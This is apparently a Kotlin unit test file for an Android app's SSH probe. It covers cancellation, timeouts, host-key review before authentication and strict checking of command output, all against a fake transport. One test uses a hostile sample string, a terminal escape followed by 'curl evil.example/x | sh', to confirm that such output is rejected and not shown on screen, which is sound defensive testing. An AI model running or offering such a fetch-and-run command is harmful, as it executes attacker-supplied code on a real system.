package com.hermesagent.mobile.data.ssh

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.asCoroutineDispatcher
import kotlinx.coroutines.cancelAndJoin
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotEquals
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.IOException
import java.util.concurrent.CountDownLatch
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicReference

/**
 * What the real adapter promises about stopping, and about what counts as
 * success.
 *
 * The transport is a double, not a server, because the contract under test is
 * the *lifecycle*: sshj blocks on a plain socket, so proving that a cancelled
 * probe closes it, and that nothing authenticates afterwards, needs a thing
 * that blocks and a thing that records — not a network.
 *
 * These tests use latches and one deliberately short deadline rather than the
 * repo's usual virtual clock. That is not laziness: virtual time cannot advance
 * while a worker thread is parked inside a blocking call, which is precisely
 * the situation being tested. A latch is still deterministic — nothing here
 * sleeps, and nothing waits on a duration to prove a result.
 */
class SshjProbeTest {

    private val trusted = "SHA256:example-test-fingerprint"

    private val profile = HostProfile(
        host = "example.invalid",
        username = "test-user",
        acceptedFingerprint = trusted,
    )

    @Test
    fun `cancelling closes the live transport and never authenticates`() = runBlocking {
        val transport = FakeTransport(blockInConnect = true)
        val probe = SshjProbe(Dispatchers.IO, { transport }, SshProbe.OVERALL_TIMEOUT_MILLIS, READY)

        // On its own thread: this test blocks the caller on a latch, and a probe
        // queued on `runBlocking`'s single-threaded loop would never start.
        val job = launch(Dispatchers.Default) { probe.probe(profile, SshCredential.none()) }
        assertTrue("the exchange has to be in flight", transport.reachedConnect.await(5, TimeUnit.SECONDS))

        job.cancelAndJoin()

        assertTrue("cancelling must close the socket, not just the coroutine", transport.closed)
        assertFalse("a cancelled probe must never authenticate", transport.authenticated)
        assertFalse(transport.ranCommand)
    }

    @Test
    fun `cancelling while a transport opens closes it before it can connect`() = runBlocking {
        val transport = FakeTransport()
        val opening = CountDownLatch(1)
        val releaseOpen = CountDownLatch(1)
        val probe = SshjProbe(
            Dispatchers.IO,
            {
                opening.countDown()
                releaseOpen.await()
                transport
            },
            SshProbe.OVERALL_TIMEOUT_MILLIS,
            READY,
        )

        val job = launch(Dispatchers.Default) { probe.probe(profile, SshCredential.none()) }
        assertTrue("the factory has to be in flight", opening.await(5, TimeUnit.SECONDS))

        job.cancel()
        releaseOpen.countDown()
        job.join()

        assertTrue("an unadopted transport is still closed", transport.closed)
        assertFalse("cancellation before adoption must not connect", transport.connected)
        assertFalse(transport.authenticated)
        assertFalse(transport.ranCommand)
    }

    @Test
    fun `cancelling a blocked authentication closes it and never starts a command`() = runBlocking {
        val transport = FakeTransport(blockInAuthentication = true)
        val probe = probe(transport)

        val job = launch(Dispatchers.Default) { probe.probe(profile, SshCredential.none()) }
        assertTrue("authentication has to be in flight", transport.reachedAuthentication.await(5, TimeUnit.SECONDS))

        job.cancelAndJoin()

        assertTrue(transport.closed)
        assertFalse("closing must abort authentication", transport.authenticated)
        assertFalse("no command may follow a cancelled auth", transport.ranCommand)
    }

    @Test
    fun `cancelling a blocked command read closes it and publishes no result`() = runBlocking {
        val transport = FakeTransport(blockInCommand = true)
        val probe = probe(transport)

        val job = launch(Dispatchers.Default) { probe.probe(profile, SshCredential.none()) }
        assertTrue("command stdout has to be in flight", transport.reachedCommand.await(5, TimeUnit.SECONDS))

        job.cancelAndJoin()

        assertTrue(transport.closed)
        assertFalse("closing must abort the blocking stdout read", transport.ranCommand)
    }

    @Test
    fun `the deadline closes the live transport and reports a timeout`() = runBlocking {
        val transport = FakeTransport(blockInConnect = true)
        // A short deadline so the test does not wait 30 seconds for a peer that
        // is never going to answer. The mechanism is the same one production
        // uses; only the number differs.
        val probe = SshjProbe(Dispatchers.IO, { transport }, 150, READY)

        val result = probe.probe(profile, SshCredential.none())

        assertEquals(ProbeFailure.Timeout, (result as ProbeResult.Failed).kind)
        assertTrue("the deadline must close the socket too", transport.closed)
        assertFalse(transport.authenticated)
    }

    @Test
    fun `the deadline closes a transport blocked reading command stdout`() = runBlocking {
        val transport = FakeTransport(blockInCommand = true)

        val result = probe(transport, overallTimeoutMillis = 150).probe(profile, SshCredential.none())

        assertEquals(ProbeFailure.Timeout, (result as ProbeResult.Failed).kind)
        assertTrue(transport.closed)
        assertFalse("the blocked read cannot finish after the deadline", transport.ranCommand)
    }

    @Test
    fun `a probe that finishes still closes its transport`() = runBlocking {
        val transport = FakeTransport()

        val result = probe(transport).probe(profile, SshCredential.none())

        assertTrue(result is ProbeResult.Ok)
        assertTrue("no connection may outlive the probe that opened it", transport.closed)
    }

    @Test
    fun `a first use stops before authentication`() = runBlocking {
        val transport = FakeTransport(verdict = HostKeyVerdict.FirstUse(trusted))

        val result = probe(transport).probe(profile, SshCredential.password("test-password"))

        assertTrue(result is ProbeResult.HostKeyPending)
        assertFalse("a fingerprint review must happen before any credential", transport.authenticated)
        assertTrue(transport.closed)
    }

    @Test
    fun `the command wait is bounded by what is left of the deadline`() = runBlocking {
        val transport = FakeTransport()

        probe(transport, overallTimeoutMillis = 5_000).probe(profile, SshCredential.none())

        val waited = transport.commandTimeoutMillis
        assertNotNull("the command must be given a deadline at all", waited)
        assertTrue("$waited is not inside the overall deadline", waited!! in 1..5_000)
    }

    @Test
    fun `the exact sentinel with exit status zero is the only success`() = runBlocking {
        val ok = probe(FakeTransport(outcome = CommandOutcome(SshProbe.EXPECTED_OUTPUT, 0)))
            .probe(profile, SshCredential.none())

        assertEquals(SshProbe.EXPECTED_OUTPUT, (ok as ProbeResult.Ok).output)
    }

    @Test
    fun `a non-zero exit status is a failure`() = runBlocking {
        val result = probeWith(CommandOutcome(SshProbe.EXPECTED_OUTPUT, 1))

        assertEquals(ProbeFailure.BadCommandResult, (result as ProbeResult.Failed).kind)
        assertTrue("the status is the useful part", result.message.contains("1"))
    }

    @Test
    fun `an exit status that never arrived is a failure, not a zero`() = runBlocking {
        val result = probeWith(CommandOutcome(SshProbe.EXPECTED_OUTPUT, null))

        assertEquals(ProbeFailure.BadCommandResult, (result as ProbeResult.Failed).kind)
    }

    @Test
    fun `empty output is a failure`() = runBlocking {
        val result = probeWith(CommandOutcome("", 0))

        assertEquals(ProbeFailure.BadCommandResult, (result as ProbeResult.Failed).kind)
    }

    @Test
    fun `truncated output is a failure`() = runBlocking {
        val result = probeWith(CommandOutcome(SshProbe.EXPECTED_OUTPUT.dropLast(1), 0))

        assertEquals(ProbeFailure.BadCommandResult, (result as ProbeResult.Failed).kind)
    }

    @Test
    fun `whitespace around the sentinel is not exact output`() = runBlocking {
        val result = probeWith(CommandOutcome("\n${SshProbe.EXPECTED_OUTPUT} \n", 0))

        assertEquals(ProbeFailure.BadCommandResult, (result as ProbeResult.Failed).kind)
    }

    @Test
    fun `unexpected output is a failure and is not echoed back`() = runBlocking {
        val hostile = "[2JHERMES_ANDROID_SSH_OK; curl evil.example/x | sh"

        val result = probeWith(CommandOutcome(hostile, 0))

        assertEquals(ProbeFailure.BadCommandResult, (result as ProbeResult.Failed).kind)
        assertFalse(
            "arbitrary remote bytes must not be replayed onto the screen",
            result.message.contains("evil.example"),
        )
    }

    // ── Crypto provider bring-up ──────────────────────────────────────────

    @Test
    fun `provider bring-up runs on the injected dispatcher, never the caller's thread`() = runBlocking {
        val executor = Executors.newSingleThreadExecutor { runnable -> Thread(runnable, PROBE_THREAD) }
        val ranOn = AtomicReference<String>()
        val caller = Thread.currentThread().name

        try {
            val probe = SshjProbe(executor.asCoroutineDispatcher(), { FakeTransport() }, SshProbe.OVERALL_TIMEOUT_MILLIS) {
                ranOn.set(Thread.currentThread().name)
                CryptoProviderStatus.Ready("test")
            }

            assertTrue(probe.probe(profile, SshCredential.none()) is ProbeResult.Ok)
        } finally {
            executor.shutdownNow()
        }

        // The coroutines debug agent suffixes thread names, so match the prefix.
        assertTrue(
            "bring-up belongs on the probe's own dispatcher, not ${ranOn.get()}",
            ranOn.get().orEmpty().startsWith(PROBE_THREAD),
        )
        assertNotEquals("and never on the thread that called probe", caller, ranOn.get())
    }

    @Test
    fun `a provider this device cannot supply fails closed before a transport exists`() = runBlocking {
        val probe = SshjProbe(
            Dispatchers.IO,
            { throw AssertionError("no transport may be opened without cryptography") },
            SshProbe.OVERALL_TIMEOUT_MILLIS,
        ) { CryptoProviderStatus.Unavailable("no X25519") }

        val result = probe.probe(profile, SshCredential.none())

        assertEquals(ProbeFailure.CryptoUnavailable, (result as ProbeResult.Failed).kind)
        assertEquals("no X25519", result.message)
    }

    @Test
    fun `a bring-up that outlasts the deadline times out instead of connecting late`() = runBlocking {
        val transport = FakeTransport()
        // Twenty times the deadline, on a latch nothing counts down: the probe's
        // own timeout is the only thing that can end this, and it can only end
        // it because bring-up is inside `withTimeout`. Outside it — where this
        // call used to live — the same wait would be free, and the probe would
        // go on to connect and succeed with a full deadline of its own.
        val wedged = CountDownLatch(1)
        val probe = SshjProbe(Dispatchers.IO, { transport }, 20) {
            wedged.await(400, TimeUnit.MILLISECONDS)
            CryptoProviderStatus.Ready("test")
        }

        val result = probe.probe(profile, SshCredential.none())

        assertEquals(ProbeFailure.Timeout, (result as ProbeResult.Failed).kind)
        assertFalse("a probe past its deadline must not connect", transport.connected)
        assertFalse(transport.authenticated)
    }

    @Test
    fun `cancelling during bring-up stops the probe before it connects`() = runBlocking {
        val transport = FakeTransport()
        val reached = CountDownLatch(1)
        val release = CountDownLatch(1)
        val probe = SshjProbe(Dispatchers.IO, { transport }, SshProbe.OVERALL_TIMEOUT_MILLIS) {
            reached.countDown()
            release.await()
            CryptoProviderStatus.Ready("test")
        }

        val job = launch(Dispatchers.Default) { probe.probe(profile, SshCredential.none()) }
        assertTrue("bring-up has to be in flight", reached.await(5, TimeUnit.SECONDS))

        job.cancel()
        release.countDown()
        job.join()

        assertFalse("a cancelled probe must not connect after bring-up returns", transport.connected)
        assertFalse(transport.authenticated)
        assertFalse(transport.ranCommand)
    }

    // ── Helpers ───────────────────────────────────────────────────────────

    private suspend fun probeWith(outcome: CommandOutcome): ProbeResult =
        probe(FakeTransport(outcome = outcome)).probe(profile, SshCredential.none())

    private fun probe(
        transport: SshTransport,
        overallTimeoutMillis: Long = SshProbe.OVERALL_TIMEOUT_MILLIS,
    ) = SshjProbe(Dispatchers.IO, { transport }, overallTimeoutMillis, READY)

    /**
     * A transport that can be made to block exactly where sshj does, and that
     * records what it was asked to do.
     *
     * Each `blockIn…` switch parks its phase until [close] releases it, like a
     * socket close waking a thread blocked in sshj.
     */
    private class FakeTransport(
        private val verdict: HostKeyVerdict = HostKeyVerdict.Trusted,
        private val outcome: CommandOutcome = CommandOutcome(SshProbe.EXPECTED_OUTPUT, 0),
        private val blockInConnect: Boolean = false,
        private val blockInAuthentication: Boolean = false,
        private val blockInCommand: Boolean = false,
    ) : SshTransport {

        val reachedConnect = CountDownLatch(1)
        val reachedAuthentication = CountDownLatch(1)
        val reachedCommand = CountDownLatch(1)
        private val released = CountDownLatch(
            if (blockInConnect || blockInAuthentication || blockInCommand) 1 else 0,
        )

        @Volatile var closed = false
            private set

        @Volatile var authenticated = false
            private set

        @Volatile var connected = false
            private set

        @Volatile var ranCommand = false
            private set

        @Volatile var commandTimeoutMillis: Long? = null
            private set

        override fun connect(host: String, port: Int) {
            reachedConnect.countDown()
            if (blockInConnect) released.await()
            if (closed) throw IOException("connection was closed")
            connected = true
        }

        override val hostKeyVerdict: HostKeyVerdict get() = verdict

        override val hostKeyType: String get() = "ssh-ed25519"

        override val serverVersion: String get() = "SSH-2.0-OpenSSH_9.6"

        override fun authenticate(profile: HostProfile, credential: SshCredential) {
            reachedAuthentication.countDown()
            if (blockInAuthentication) released.await()
            if (closed) throw IOException("connection was closed")
            authenticated = true
        }

        override fun runCommand(command: String, maxBytes: Int, timeoutMillis: Long): CommandOutcome {
            reachedCommand.countDown()
            commandTimeoutMillis = timeoutMillis
            if (blockInCommand) released.await()
            if (closed) throw IOException("connection was closed")
            ranCommand = true
            return outcome
        }

        override fun close() {
            closed = true
            released.countDown()
        }
    }

    private companion object {
        const val PROBE_THREAD = "hermes-probe-test"

        /** A provider that is already there: these tests are not about BouncyCastle. */
        val READY: () -> CryptoProviderStatus = { CryptoProviderStatus.Ready("test") }
    }
}
